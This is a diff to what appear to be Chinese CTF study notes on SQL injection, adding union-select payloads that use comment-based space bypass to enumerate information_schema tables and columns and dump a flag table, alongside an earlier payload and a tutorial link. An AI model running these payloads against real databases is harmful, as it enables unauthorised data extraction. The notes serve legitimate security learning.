@@ -465,3 +465,12 @@ secrets.php?id=-1' union select 1,2,group_concat(flAg)from moectf.flag--+
 - 奇安信社区《SQL注入精粹：从0到1的注入之路》：https://forum.butian.net/share/2768
 
 - 
+-1"/**/union/**/select/**/2,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema='ctf'#
+
+```
+-1"/**/union/**/select/**/2,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='Fl4g'#
+
+ "id,des,value"
+
+-1"/**/union/**/select/**/2,group_concat(value)from ctf.Fl4g#
+```
